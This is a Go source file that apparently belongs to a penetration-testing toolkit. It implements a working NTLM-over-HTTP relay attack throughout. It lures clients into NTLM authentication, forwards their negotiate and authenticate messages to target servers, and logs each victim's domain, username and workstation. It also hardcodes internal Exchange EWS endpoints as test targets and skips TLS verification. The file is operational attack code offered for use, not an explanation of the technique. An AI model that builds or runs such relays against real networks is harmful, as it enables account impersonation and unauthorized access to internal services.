package gopRelay

import (
	"bufio"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"net/http/httputil"
	"net/url"
	"os"
	"strings"
	"sync"
	"text/tabwriter"
	"time"

	"github.com/google/uuid"
	"github.com/hophouse/gop/authentication/ntlm"
	gopproxy "github.com/hophouse/gop/gopProxy"
	"github.com/hophouse/gop/utils/logger"
)

type NTLMAuthHTTPRelay struct {
	ClientConnUUID string
	clientConn     net.Conn
	Reader         *bufio.Reader
	RemoteIP       string
	Relays         map[string]*Relay
	mu             *sync.Mutex
}

type Relay struct {
	relayUUID            string
	parentClientConnUUID string
	target               string
	conn                 *http.Client
	mu                   *sync.Mutex
	filename             string
	Domain               string
	Username             string
	Workstation          string
}

func Run(serverAddr string, targets []string) {
	logger.Print("[+] Targets :\n")
	for i, target := range targets {
		logger.Printf("\t%d : %s\n", i, target)
	}

	serverAddrTCP4, err := net.ResolveTCPAddr("tcp", serverAddr)
	if err != nil {
		logger.Fatal(err)
	}

	logger.Printf("[+] Run server on : http://%s\n", serverAddrTCP4.String())

	l, err := net.ListenTCP("tcp4", serverAddrTCP4)
	if err != nil {
		logger.Fatal(err)
	}
	defer l.Close()

	connexions := map[string]*NTLMAuthHTTPRelay{}

	for {
		conn, err := l.AcceptTCP()
		if err != nil {
			// handle error
			logger.Println(err)
			break
		}

		err = conn.SetKeepAlive(true)
		if err != nil {
			// handle error
			logger.Println(err)
			break
		}

		func() {
			remoteIP := strings.Split(conn.RemoteAddr().String(), ":")[0]
			client, exist := connexions[remoteIP]
			if !exist {
				connexion := NTLMAuthHTTPRelay{
					ClientConnUUID: strings.Split(uuid.NewString(), "-")[0],
					clientConn:     conn,
					Reader:         bufio.NewReader(conn),
					Relays:         map[string]*Relay{},
					mu:             &sync.Mutex{},
					RemoteIP:       remoteIP,
				}

				connexions[remoteIP] = &connexion
				client = connexions[remoteIP]
				logger.Printf("[+] Connexion : Adding %s to the connexion list with UUID %s\n", remoteIP, client.ClientConnUUID)
			} else {
				logger.Printf("[+] Connexion : %s already in the connexion list with UUID %s\n", remoteIP, client.ClientConnUUID)
			}

			for _, target := range targets {
				// if relay not present
				r, exist := client.Relays[target]
				if exist {
					logger.Printf("[+] Relay : %s already in the relay list with UUID %s of connexion %s\n", target, r.relayUUID, client.ClientConnUUID)
					continue
				}

				logger.Printf("[+] Relay : Process for target %s with connexion %s\n", target, client.ClientConnUUID)

				client.ProcessTarget(target)
				DisplayConnexions(connexions)
			}

			// time.Sleep(time.Second * 2)
			// TestTargets(client)
		}()
	}
}

func TestTargets(client *NTLMAuthHTTPRelay) {
	logger.Print("[+] Will test the URL :\n")

	targetURL := []string{
		"https://10.80.104.12/ews/Exchange.asmx",
		"https://10.80.104.12/ews/",
		"https://10.80.104.12/ews/Exchange.asmx",
		"https://10.80.104.12:444/ews/Exchange.asmx",
		"https://10.80.104.12:444/ews/Services.wsdl",
		"https://10.80.104.12/ews/Exchange.asmx",
	}

	for _, relay := range client.Relays {
		for _, targetU := range targetURL {
			clientAuthRequest, _ := http.NewRequest("GET", targetU, nil)
			// gopproxy.CopyHeader(clientAuthRequest.Header, clientInitiateRequest.Header)
			_, err := relay.SendRequestGetResponse(clientAuthRequest, "gop", "target")
			if err != nil {
				logger.Printf("Error during test of the URL %s : %s\n", targetU, err)
			}

			time.Sleep(time.Second * 1)
		}
	}
}

func (n *NTLMAuthHTTPRelay) ProcessTarget(target string) {
	// clientInitiateRequest, err := n.initiateWWWAuthenticate()
	// if err != nil {
	// 	logger.Println(n.clientConn, err)
	// 	return
	// }

	err := n.initiateRelais(target)
	if err != nil {
		logger.Println(n.ClientConnUUID, ":", err)
		return
	}

}

func (n *NTLMAuthHTTPRelay) initiateWWWAuthenticate() (*http.Request, error) {
	for {
		reader := bufio.NewReader(n.clientConn)

		clientInitiateRequest, err := http.ReadRequest(reader)
		if err != nil {
			logger.Fprintln(logger.Writer(), err)
			return nil, err
		}
		clientInitialRequestDump, err := httputil.DumpRequest(clientInitiateRequest, true)
		if err != nil {
			logger.Fprintln(logger.Writer(), err)
			return nil, err
		}
		io.Copy(ioutil.Discard, clientInitiateRequest.Body)
		clientInitiateRequest.Body.Close()

		for _, line := range strings.Split(string(clientInitialRequestDump), "\n") {
			logger.Fprintf(logger.Writer(), "%s | client -> gop | %s\n", n.ClientConnUUID, line)
		}
		logger.Fprint(logger.Writer(), "\n")

		// Send WWW-Authenticate: NTLM header if not present
		if clientAuthorization := clientInitiateRequest.Header.Get("Authorization"); clientAuthorization == "" {
			clientInitialResponseByte := []byte(
				"HTTP/1.1 401 Unauthorized\n" +
					"WWW-Authenticate: NTLM\n" +
					"WWW-Authenticate: Negociate\n" +
					"Connection: keep-alive\n" +
					"Content-Length: 0\n" +
					"\n\n")

			n.clientConn.Write(clientInitialResponseByte)

			for _, line := range strings.Split(string(clientInitialResponseByte), "\n") {
				fmt.Fprintf(logger.Writer(), "%s | client <- gop | %s\n", n.ClientConnUUID, line)
			}
			logger.Fprint(logger.Writer(), "\n")

			continue
		} else {
			return clientInitiateRequest, nil
		}
	}
}

func (n *NTLMAuthHTTPRelay) initiateRelais(target string) error {
	var err error
	n.mu.Lock()
	defer n.mu.Unlock()

	targetURLSanitized := strings.Replace(
		strings.Replace(
			strings.Replace(
				strings.Replace(target, "?", "", -1),
				"#", "", -1),
			":", "", -1),
		"/", "", -1)

	currentRelay := Relay{
		relayUUID:            strings.Split(uuid.NewString(), "-")[0],
		parentClientConnUUID: n.ClientConnUUID,
		target:               target,
		mu:                   &sync.Mutex{},
	}
	currentRelay.filename = fmt.Sprintf("%s-%s-%s-%s.html", time.Now().Format("20060102-150405"), n.ClientConnUUID, currentRelay.relayUUID, targetURLSanitized)

	proxyURL, _ := url.Parse("http://127.0.0.1:8888")
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		Proxy:           http.ProxyURL(proxyURL),
	}
	currentRelay.conn = &http.Client{Transport: tr}

	var clientRequest *http.Request

	/*
	 * Copy of initiate
	 */

	for {

		clientRequest, err = http.ReadRequest(n.Reader)
		if err != nil {
			logger.Fprintln(logger.Writer(), err)
			return err
		}
		clientInitialRequestDump, err := httputil.DumpRequest(clientRequest, true)
		if err != nil {
			logger.Fprintln(logger.Writer(), err)
			return err
		}
		io.Copy(ioutil.Discard, clientRequest.Body)
		clientRequest.Body.Close()

		for _, line := range strings.Split(string(clientInitialRequestDump), "\n") {
			logger.Fprintf(logger.Writer(), "%s | %s | client -> gop | %s\n", n.ClientConnUUID, currentRelay.relayUUID, line)
		}
		logger.Fprint(logger.Writer(), "\n")

		// Send WWW-Authenticate: NTLM header if not present
		if clientAuthorization := clientRequest.Header.Get("Authorization"); clientAuthorization == "" {
			clientInitialResponseByte := []byte(
				"HTTP/1.1 401 Unauthorized\n" +
					"WWW-Authenticate: NTLM\n" +
					"WWW-Authenticate: Negociate\n" +
					"Connection: keep-alive\n" +
					"Content-Length: 0\n" +
					"\n\n")

			n.clientConn.Write(clientInitialResponseByte)

			for _, line := range strings.Split(string(clientInitialResponseByte), "\n") {
				fmt.Fprintf(logger.Writer(), "%s | client <- gop | %s\n", n.ClientConnUUID, line)
			}
			logger.Fprint(logger.Writer(), "\n")

			continue
		}

		/*
		 * End of copy of initiate
		 */

		// Get the response header.
		clientAuthorization := clientRequest.Header.Get("Authorization")

		authorization_bytes, err := base64.StdEncoding.DecodeString(clientAuthorization[5:])
		if err != nil {
			err := fmt.Errorf("decode error authorization header : %s", clientAuthorization)
			logger.Panicln(err)
			continue
			// return err
		}
		msgType := binary.LittleEndian.Uint32(authorization_bytes[8:12])

		logger.Fprintf(logger.Writer(), "%s | %s | [+] Message type : %d\n", n.ClientConnUUID, currentRelay.relayUUID, msgType)

		/*
		 * Message Type 1
		 */

		// Received Negociate message. Handle it and answer with a Challenge message

		if msgType == uint32(1) {
			// Client Negotiate
			serverNegociateRequest := ntlm.NTLMSSP_NEGOTIATE{}
			serverNegociateRequest.Read(authorization_bytes)

			logger.Fprintf(logger.Writer(), "%s | %s | client :: gop | [+] NTLM NEGOCIATE\n", n.ClientConnUUID, currentRelay.relayUUID)
			for _, line := range strings.Split(serverNegociateRequest.ToString(), "\n") {
				logger.Fprintf(logger.Writer(), "%s | %s | client :: gop | %s\n", n.ClientConnUUID, currentRelay.relayUUID, line)

			}

			/*
			 *
			 * Client part
			 *
			 */

			clientNegotiateRequest := gopproxy.CopyRequest(clientRequest)
			clientNegotiateRequest.URL, _ = url.Parse(currentRelay.target)

			clientNegotiateResponse, err := currentRelay.SendRequestGetResponse(clientNegotiateRequest, "gop", "target")
			if err != nil {
				logger.Println(err)
				return err
			}

			authorization := clientNegotiateResponse.Header.Get("Www-Authenticate")

			if clientNegotiateResponse.StatusCode != 401 {
				err := fmt.Errorf("client respond with a %s code", clientNegotiateResponse.Status)
				logger.Fprintf(logger.Writer(), "%s | %s | Error       : %s\n", n.ClientConnUUID, currentRelay.relayUUID, err)
				currentRelay.conn.CloseIdleConnections()
				return err
			}

			authorization_bytes, err = base64.StdEncoding.DecodeString(authorization[5:])
			if err != nil {
				err := fmt.Errorf("decode error authorization header : %s", authorization)
				return err
			}

			clientChallengeNTLM := ntlm.NTLMSSP_CHALLENGE{}
			clientChallengeNTLM.Read(authorization_bytes)

			logger.Fprintf(logger.Writer(), "%s | %s | gop :: target | [+] Client Challenge\n", n.ClientConnUUID, currentRelay.relayUUID)
			for _, line := range strings.Split(clientChallengeNTLM.ToString(), "\n") {
				fmt.Fprintf(logger.Writer(), "%s | %s | gop :: target | %s\n", n.ClientConnUUID, currentRelay.relayUUID, line)
			}

			/*
			 *
			 * End client part
			 *
			 */
			clientNegotiateResponseDump, err := httputil.DumpResponse(clientNegotiateResponse, true)
			if err != nil {
				logger.Println(err)
				continue
				// return err
			}

			n.clientConn.Write(clientNegotiateResponseDump)
			for _, line := range strings.Split(string(clientNegotiateResponseDump), "\n") {
				logger.Fprintf(logger.Writer(), "%s | %s | client <- gop | %s\n", n.ClientConnUUID, currentRelay.relayUUID, line)
			}

			logger.Fprintf(logger.Writer(), "%s | %s | client :: gop | [+] Sent server challenge to client\n", n.ClientConnUUID, currentRelay.relayUUID)

			continue
		}

		/*
		 * End Message Type 1
		 */

		// // Retrieve information into the Authentication message
		/*
		 * Message Type 3
		 */
		if msgType == uint32(3) {
			logger.Fprintf(logger.Writer(), "%s | %s | client :: gop | [+] Server received Authenticate\n", n.ClientConnUUID, currentRelay.relayUUID)

			serverAuthenticate := ntlm.NTLMSSP_AUTH{}
			serverAuthenticate.Read(authorization_bytes)

			currentRelay.Domain = string(serverAuthenticate.TargetName.RawData)
			currentRelay.Username = string(serverAuthenticate.Username.RawData)
			currentRelay.Workstation = string(serverAuthenticate.Workstation.RawData)

			logger.Fprintf(logger.Writer(), "%s | %s | client :: gop | [+] Server authenticate\n", n.ClientConnUUID, currentRelay.relayUUID)
			for _, line := range strings.Split(serverAuthenticate.ToString(), "\n") {
				logger.Fprintf(logger.Writer(), "%s | %s | client :: gop | %s\n", n.ClientConnUUID, currentRelay.relayUUID, line)
			}

			// Prepare final response to the client
			ntlmv2Response := ntlm.NTLMv2Response{}
			ntlmv2Response.Read(serverAuthenticate.NTLMv2Response.RawData)

			fmt.Fprintf(logger.Writer(), "%s | %s | client :: gop | [+] NTLM AUTHENTICATE RESPONSE:\n", n.ClientConnUUID, currentRelay.relayUUID)
			for _, line := range strings.Split(string(ntlmv2Response.ToString()), "\n") {
				fmt.Fprintf(logger.Writer(), "%s | %s | client :: gop | %s\n", n.ClientConnUUID, currentRelay.relayUUID, line)
			}

			/*
			 *
			 * Client part
			 *
			 */

			clientAuthRequest, _ := http.NewRequest("GET", target, nil)
			gopproxy.CopyHeader(clientAuthRequest.Header, clientRequest.Header)
			clientAuthResponse, err := currentRelay.SendRequestGetResponse(clientAuthRequest, "gop", "target")
			if err != nil {
				logger.Println(err)
				continue
				// return err
			}

			if clientAuthResponse.StatusCode == 401 {
				return fmt.Errorf("could not authenticate to the endpoint")
			}

			/*
			 *
			 * End client part
			 *
			 */

			randomPath := uuid.NewString()
			clientInitialResponseByte := []byte(
				"HTTP/1.1 307 Temporary Redirect\n" +
					"Location: /" + randomPath + " \n" +
					// "WWW-Authenticate: NTLM\n" +
					// "WWW-Authenticate: Negociate\n" +
					"Connection: keep-alive\n" +
					"Content-Length: 0\n" +
					"\n\n")

			// clientInitialResponseByte := []byte(
			// 	"HTTP/1.1 200 OK\n" +
			// 		"WWW-Authenticate: NTLM\n" +
			// 		"WWW-Authenticate: Negociate\n" +
			// 		"Connection: keep-alive\n" +
			// 		"Keep-Alive: timeout=8888888888888888, max=88888888" +
			// 		"Content-Length: 0\n" +
			// 		"\n\n\n")

			n.clientConn.Write(clientInitialResponseByte)
			for _, line := range strings.Split(string(clientInitialResponseByte), "\n") {
				fmt.Fprintf(logger.Writer(), "%s | %s | client <- gop | %s\n", n.ClientConnUUID, currentRelay.relayUUID, line)
			}
			logger.Fprint(logger.Writer(), "\n")

			// clientWWWAuthenticateResponseByte := []byte(
			// 	"HTTP/1.1 401 Unauthorized\n" +
			// 		"WWW-Authenticate: NTLM\n" +
			// 		"WWW-Authenticate: Negociate\n" +
			// 		"Connection: keep-alive\n" +
			// 		"Keep-Alive: timeout=8888888888888888, max=88888888" +
			// 		"Content-Length: 0\n" +
			// 		"\n\n\n")

			break
		}
		/*
		 * End Message Type 3
		 */

	}

	n.Relays[currentRelay.target] = &currentRelay

	return nil
}

func DisplayConnexions(connexions map[string]*NTLMAuthHTTPRelay) {
	logger.Print("\n[+] Connexions:\n")

	w := tabwriter.NewWriter(os.Stdout, 8, 0, 4, ' ', 0)

	for remoteIP, connexion := range connexions {
		if len(connexion.Relays) > 0 {
			for target, relay := range connexion.Relays {
				logger.Fprintf(w, "%s\t%s\t%s\t%s\\%s@%s\t%s\n", connexion.ClientConnUUID, remoteIP, relay.relayUUID, relay.Domain, relay.Username, relay.Workstation, target)
			}
		}
	}

	w.Flush()
	logger.Print("\n")
}

func (r *Relay) SendRequestGetResponse(clientRequest *http.Request, c string, s string) (*http.Response, error) {
	r.mu.Lock()

	// clientRequest := gopproxy.CopyRequest(clientInitiateRequest)
	// clientRequest.Method = "GET"
	// targetURL, err := url.Parse(r.target)
	// if err != nil {
	// 	logger.Fprintln(logger.Writer(), err)
	// 	return nil, err
	// }
	// clientRequest.URL = targetURL
	clientRequest.Header.Set("Connection", "keep-alive")
	clientRequest.Header.Set("Keep-Alive", "timeout=8888888888888888, max=88888888")
	clientRequest.Header.Set("Accept-Encoding", "deflate")
	if clientRequest.Header.Get("Content-Length") == "" {
		clientRequest.Header.Set("Content-Length", "0")
	}

	clientRequestDump, err := httputil.DumpRequest(clientRequest, true)
	if err != nil {
		logger.Fprintln(logger.Writer(), err)
		return nil, err
	}

	for _, line := range strings.Split(string(clientRequestDump), "\n") {
		logger.Fprintf(logger.Writer(), "%s | %s | %s -> %s : %s\n", r.parentClientConnUUID, r.relayUUID, c, s, line)
	}
	logger.Fprint(logger.Writer(), "\n")

	clientResponse, err := r.conn.Do(clientRequest)
	if err != nil {
		logger.Fprintln(logger.Writer(), err)
		return nil, err
	}
	clientResponseDump, err := httputil.DumpResponse(clientResponse, true)
	if err != nil {
		logger.Fprintln(logger.Writer(), err)
		return nil, err
	}
	io.Copy(ioutil.Discard, clientResponse.Body)
	clientResponse.Body.Close()

	for _, line := range strings.Split(string(clientResponseDump), "\n") {
		logger.Fprintf(logger.Writer(), "%s | %s | %s <- %s : %s\n", r.parentClientConnUUID, r.relayUUID, c, s, line)
	}
	logger.Fprint(logger.Writer(), "\n")

	f, err := os.OpenFile(r.filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		logger.Println(err)
	}
	defer f.Close()

	_, err = f.Write(clientRequestDump)
	if err != nil {
		logger.Println(err)
	}

	_, err = f.Write(clientResponseDump)
	if err != nil {
		logger.Println(err)
	}

	r.mu.Unlock()

	return clientResponse, nil
}

func (r *Relay) SendResponseGetRequest(clientResponse []byte, c string, s string) (*http.Request, error) {
	return nil, fmt.Errorf("function not yet implemented")
}

func KeepAlive(w http.ResponseWriter, wg *sync.WaitGroup) {
	wg.Add(1)

	for {
		logger.Println("[+] Sending keep alive")

		hj, _ := w.(http.Hijacker)
		_, buf, _ := hj.Hijack()
		buf.WriteString("HTTP/1.1 200 OK")
		buf.WriteString("Connection: keep-alive")
		buf.WriteString("\n\n")
		buf.Flush()

		time.Sleep(20 * time.Second)
	}
}
